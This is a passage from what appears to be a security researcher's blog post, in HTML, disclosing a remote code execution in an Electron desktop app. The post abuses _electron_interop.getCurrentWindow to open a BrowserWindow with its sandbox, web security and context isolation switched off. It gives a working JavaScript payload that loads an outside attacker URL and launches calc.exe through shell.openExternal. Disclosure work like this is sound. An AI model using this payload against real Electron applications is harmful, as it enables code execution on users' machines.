+    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAl0lEQVQY05WN0Q6CMAxF+RPG2rVjjIEDhICgmUb//4/MRF8UH0huTtqmJzcZ2qH3jS1LJK0oJzaoNOtIYqPisZDAIgOR4VeSyYWTD50dNTtQDEgSaKUEXplJ9WtGeXHX8XBufF/YKhWQitjwGvCzwmZtlIO7H81c1W1Vewm0+fQvSXCP3s6c213aW764W1dMxtaILMQ++QmSXjSrN8jUAgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Window Object _electron_interop function"
+        title="Window Object _electron_interop function"
+        src="/static/90288fe8286530471c0dac631fcdfb02/37523/a-3.png"
+        srcset="/static/90288fe8286530471c0dac631fcdfb02/e9ff0/a-3.png 180w,
+/static/90288fe8286530471c0dac631fcdfb02/f21e7/a-3.png 360w,
+/static/90288fe8286530471c0dac631fcdfb02/37523/a-3.png 720w,
+/static/90288fe8286530471c0dac631fcdfb02/302a4/a-3.png 1080w,
+/static/90288fe8286530471c0dac631fcdfb02/48ca3/a-3.png 1084w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Among each method defined as <code class="language-text">_electron_interop</code>, it is a <code class="language-text">getCurrentWindow</code> method that can trigger code execution.</li>
+<li><code class="language-text">GetCurrentWindow</code> The inherited object has a <code class="language-text">BrowserWindow</code> object, which can be used as an API to create and control the browser’s window of the current web page, enabling <code class="language-text">NodeIntegration</code> to run key Node JS and releasing detailed security options.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABS0lEQVQY022Qy07CUBCG+xZyKe05vUFPWyAmuiG+gBq8LJGL+kr6CLpwAxiRLZigvgOwgUWhFRYYSAhtz5i2LNrEky9nZvPN/BmGaAWVEB9d5Tj+5el5u3Ms+8eybWuxsJZL/7ft2Xz+u15326+Ix1iQQ5igSFiQBFFJJdn3VhsAXNcFANhuYbWCzQYAPM8DgK/+B5dBCEshDIfFDJLSSCzlyGVWHTw8gmm6pknNGR2N6HBIx2M6nbqTCQAM+n1fFuS9nBOVM2JcafkTVUsl2E642XEg/rwgy2cvLhtStqSoR3LuOEv4JNtpRmJTuseXvX9kHkss8pNzgpxIpN+aLQDYOY5HaRTH8ccNer24jEQcdFhUkgfpbvRgsdj+5u/gYDwSQ5hC8VCSFEIMI18kmlE+Pb+v39Yr1cZNLUq9Ur2rNa7LF7qe141CyB9jcgAn/2856AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Sandbox Escape"
+        title="Sandbox Escape"
+        src="/static/b0f4c652487e1120aebbcc6851c3a76b/37523/origin.png"
+        srcset="/static/b0f4c652487e1120aebbcc6851c3a76b/e9ff0/origin.png 180w,
+/static/b0f4c652487e1120aebbcc6851c3a76b/f21e7/origin.png 360w,
+/static/b0f4c652487e1120aebbcc6851c3a76b/37523/origin.png 720w,
+/static/b0f4c652487e1120aebbcc6851c3a76b/302a4/origin.png 1080w,
+/static/b0f4c652487e1120aebbcc6851c3a76b/2cefc/origin.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>In order to create an object ‘Browser Window’ of ‘getCurrentWindow’, it can be confirmed that a new window is turned on as follows as a result of loading after applying the corresponding attribute.</li>
+<li>The desired goal is Code Execution, and the API is used because it can be used if the ‘Node Integration’ attribute is activated in a way that utilizes NodeJS to perform it.</li>
+</ul>
+<p><strong>Let’s refer to the next document.</strong></p>
+<p><a href="https://tinydew4.github.io/electron-ko/docs/api/browser-window/">BrowserWindow</a></p>
+<ul>
+<li>Let’s set the webPreferences function, which is the browser window sub-attribute described above.</li>
+<li>Since it will be redirected to an external host, if you check the security policies for the object, it is recommended to use the important Node JS, whether to use JS internally, release SOP to communicate with the external host, and release quarantine so that preloaded script access can be used externally. It also releases the sandbox of the browser.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABTElEQVQY022Ry07CUBCG+xYqbemVGgEviVE3mpgQgxSKLHw2je+ggIgLX0ATRZAY4juoBGh77qc9CohGZfIt/ll8M5mM5DjO9s5aejWj6dZKeuOocux5XqFQzOcLc3HdYi53oOmWbthSUrOy2eXNrXVZ1Q7d0uv7YOiD/sCfy1t/CBC9vbtXVM0wU1ImnXFsx7KcxYRS8ioAUcoFYTHlYsZPxjQSQnS6z4qqm5YjWbZjmqmxvKS4pbIfIkQ4QBRiBjEDiPuAo0mGmIWQxEK02k+yMtms6bZm2OZMDgDGNIKYIcIx4QFk/RHFlCPCp0OFEI/t7pesG7b+LRfLIx9AREOAASQAkiDEowBO86RFUSweWp2/8sKi7JUrjDEhRBzHYl5F0fjmXu/ll2yYqYSc3N3bP7+o1y+b1VqjVr/6T7XWaF7fnJyeqUnj81Uf8McfWVZ/edcAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="external web server open"
+        title="external web server open"
+        src="/static/48af65c118536df3eebc0acbcab219b3/37523/a-4.png"
+        srcset="/static/48af65c118536df3eebc0acbcab219b3/e9ff0/a-4.png 180w,
+/static/48af65c118536df3eebc0acbcab219b3/f21e7/a-4.png 360w,
+/static/48af65c118536df3eebc0acbcab219b3/37523/a-4.png 720w,
+/static/48af65c118536df3eebc0acbcab219b3/302a4/a-4.png 1080w,
+/static/48af65c118536df3eebc0acbcab219b3/2cefc/a-4.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>You can download malicious files by proceeding with external requests using the load URL API.</li>
+<li>The internal file of the target host stage can be accessed using <code class="language-text">file://</code> Schema and if external requests are possible, proceed after releasing the <code class="language-text">SOP</code>.</li>
+<li>The <code class="language-text">win.webContents API</code> can utilize the object to perform Remote Code Execution through nodejs, which can be considered as the total management of the concept of IPC communication between the main process and the rendering process.</li>
+<li>Node js may be executed based on the main frame of the newly created window. By calling an external script using the corresponding window, you can finally check the result of the shell execution through the <code class="language-text">contents.execute.JavaScript</code> API as follows.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 42.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABt0lEQVQY0zXQS08TURjG8fkOBpiROnMu73nPmTmdgdJpuxCBakzjwmS0gpp44wOZuBQkbDT6FYzGIha0C2M0xgSjtmWmtmsvBRfGY1o0+eXZ/TePBRQ8BnFJF0oRBfQoeIRppXearW72td1N06yf9QZZb5Bm/SNZr9/Z7+192LO09DkXClEpyQAJBc9jUZBPu6kx5vPHzvOnje1njReNrVZz91Vzt7Xzsrm1/e71m1/DQ6s0VywUosBXiIgCFUpGYUaHXz61jTGbaxu5SZu55ISTYy4FwgUFe8JeSeoH34eWFkpwCUz8w5F4LAzy7c7+KF7fPD7p+DJAkIKj4OgL5U67Vy4uH/44sIAJRoFRoOMVTNRksDwXZ4+fGGM27t4jU84ZHVWVnhEKOQJI28nVL1waxd44q6C/pIJYKMaEpBAHYfvte2PMw9t3Int6Hv1FoU4JWeLICD82MZWcT4bfflouBc3xrK9PK11VQQjScalU+UGvb4x5dP8BobwQV8LZYjRWKJbRz6/eWDW//1iEAqHg/jd6m3DG8XJSv3XtZlI7dzKarZYqS3H5yGJcXijGtfmF6ytX/wLv4qr3SIB74wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="RCE Exploit flow"
+        title="RCE Exploit flow"
+        src="/static/83791118fcb4ff78a37013d270ab2148/37523/exploit-flow-1.png"
+        srcset="/static/83791118fcb4ff78a37013d270ab2148/e9ff0/exploit-flow-1.png 180w,
+/static/83791118fcb4ff78a37013d270ab2148/f21e7/exploit-flow-1.png 360w,
+/static/83791118fcb4ff78a37013d270ab2148/37523/exploit-flow-1.png 720w,
+/static/83791118fcb4ff78a37013d270ab2148/302a4/exploit-flow-1.png 1080w,
+/static/83791118fcb4ff78a37013d270ab2148/2cefc/exploit-flow-1.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Finally, it can be seen that the Script operates as shown in the picture above. Based on this, Code JS may be executed through a Script executed on an external server (attack server) to trigger code requests.</li>
+</ul>
+<h2 id="any-additional-information" style="position:relative;"><a href="#any-additional-information" aria-label="any additional information permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Any additional information?</h2>
+<h3 id="payload" style="position:relative;"><a href="#payload" aria-label="payload permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Payload</h3>
+<p><strong>payload (node js code execution)</strong></p>
+<ul>
+<li>Node JS is used to run code on the OS. Therefore, the <code class="language-text">NodeIntegration</code> property of the Electron Application is activated.</li>
+</ul>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token keyword">var</span> i_b <span class="token operator">=</span> _electron_interop<span class="token punctuation">.</span><span class="token function">getCurrentWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    i_i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">i_b</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>
+        <span class="token punctuation">{</span>
+            width<span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">,</span>
+            height<span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">,</span>
+            webPreferences<span class="token operator">:</span><span class="token punctuation">{</span>
+                javascript<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+                webSecurity<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+                sandbox<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+                contextIsolation<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+                nodeIntegration<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// window, macOS, Linux</span>
+    <span class="token keyword">var</span> o_1 <span class="token operator">=</span> <span class="token string">"const {shell}=require('electron');shell.openExternal('file:C:/Windows/System32/calc.exe')"</span><span class="token punctuation">;</span>
+    i_i_b<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token string">"&lt;http://zer0Luck.kr/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    i_i_b<span class="token punctuation">.</span>webContents<span class="token punctuation">.</span>mainFrame<span class="token punctuation">.</span><span class="token function">executeJavaScript</span><span class="token punctuation">(</span>o_1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
+<p><strong>Electron Application BrowserWindow API</strong></p>
+<p>The following are related to the Electron Application BrowserWindow API.</p>
+<ul>
+<li><strong>webPreferences Object (optional)</strong> — Settings of web page’s features.</li>
+<li><strong>javascript (Boolean-optional)</strong> Enables JavaScript Support (Default is true)</li>
+<li><strong>webSecurity (Boolean-optional)</strong> When <code class="language-text">false</code>, it will disable the <code class="language-text">same-origin policy</code> (usually using testing websites by peorple), and set <code class="language-text">allowRunningInsecureContent</code> to <code class="language-text">true</code> if this options has not been set by user (Default is true)</li>
+<li><strong>sandbox (Boolean-optional)</strong> if set, this will <code class="language-text">sandbox</code> the renderer associated with the window, making it compatible with the Chromium OS-level <code class="language-text">sandbox</code> and disabling the Node.js engine. This is not the same as the <code class="language-text">nodeIntegration</code> option and the APIs available to the preload script are more limited.</li>
+<li><strong>context isolation (Boolean-optional)</strong> Whether to run Electron APIs and the specified preload script in a separate Javascript Context. This option should be used when loading potentially untrusted remote content to ensure the loaded content cannot tamper with the preload script and any Electron APIs being used</li>
+</ul>
+<p><strong>Node JS Code execution payload</strong></p>
+<ul>
+<li>Because Node JS is enabled, you can use the following Electron Application APIs.</li>
+</ul>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token keyword">const</span> <span class="token punctuation">{</span>shell<span class="token punctuation">}</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    shell<span class="token punctuation">.</span><span class="token function">openExternal</span><span class="token punctuation">(</span><span class="token string">'file:C:/Windows/System32/calc.exe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
+<ul>
+<li>It is an API in the form of <code class="language-text">shell.openExternal(url[, options])</code> and the following are sub-related contents.</li>
+</ul>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    shell<span class="token punctuation">.</span><span class="token function">openExternal</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> url <span class="token keyword">is</span> Path <span class="token keyword">of</span> the file to be executed</code></pre></div>
+<ul>
+<li>Assign the corresponding code to a string variable.</li>
+</ul>
+<p><strong>Electron Application****loadURL API</strong></p>
+<ul>
+<li>electron Application loadURL API (Contentes Load API)</li>
+<li>Based on the Electron Application loadURL API, it proceeds to download files and codes in the attacker’s server.</li>
+</ul>
+<p>The following is the attack direction and usage plan for loadURL.</p>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token comment">// Remote URL load</span>
+    win<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token string">'malware domain'</span><span class="token punctuation">)</span><span class="token comment">// local file load</span>
+    win<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/app/index.html</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span></code></pre></div>
+<p><strong>executeJavascript API</strong></p>
+<ul>
+<li>executeJavascript API is used to interpret and execute NodeJS code to be used for attack.</li>
+</ul>
+<p>The following is the usage format of that API.</p>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token function">BrowserWindow</span><span class="token punctuation">(</span>Instance<span class="token punctuation">)</span><span class="token punctuation">.</span>webContents<span class="token punctuation">.</span>mainFrame<span class="token punctuation">.</span><span class="token function">executeJavaScript</span><span class="token punctuation">(</span><span class="token constant">CODE</span> <span class="token constant">EXECUTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div></div><div class="post-navigator"><div class="post-navigator-card-wrapper"><a class="post-card prev" href="/cloud-service-vuln-8/"><div class="direction">이전 글</div><div class="title">클라우드 서비스 취약점 분석 8 (CloudGoat: codebuild_secrets)</div></a></div><div class="post-navigator-card-wrapper"><a class="post-card next" href="/spatial-dos/"><div class="direction">다음 글</div><div class="title">Spatial.io Commercial Service Feature Bypass 0-day Vulnerability Report</div></a></div></div><div class="utterances"></div></main><footer class="page-footer-wrapper"><p class="page-footer">© <!-- -->2022<!-- --> <a href="https://github.com/dnsdudrla97">Zer0Luck</a></p></footer><div class="dark-mode-button-wrapper"><button class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium dark-mode-button css-1yxmbwk" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge dark-mode-icon css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="DarkModeIcon"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"></path></svg></button></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/gathertown-rce-electronjs/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-1c8b3614439a319fec88.js"],"app":["/app-61878ba49aed1e6f5a29.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-337569e9b8b595464a6b.js"],"component---src-pages-404-js":["/component---src-pages-404-js-4af44e3849f20b513e0c.js"],"component---src-pages-about-js":["/component---src-pages-about-js-4e6e8748abdae0a93053.js"],"component---src-pages-index-js":["/component---src-pages-index-js-0efe0b9bc9ce9e041f22.js"],"component---src-templates-blog-template-js":["/component---src-templates-blog-template-js-484a59d2475d768e59bb.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-d285fa677ae56436e6bf.js"]};/*]]>*/</script><script src="/polyfill-1c8b3614439a319fec88.js" nomodule=""></script><script src="/component---src-templates-blog-template-js-484a59d2475d768e59bb.js" async=""></script><script src="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-350e20f31e27e07c540f.js" async=""></script><script src="/app-61878ba49aed1e6f5a29.js" async=""></script><script src="/framework-98bc37d489de49fb3b96.js" async=""></script><script src="/webpack-runtime-73f29b2cfeafab2e462d.js" async=""></script></body></html>
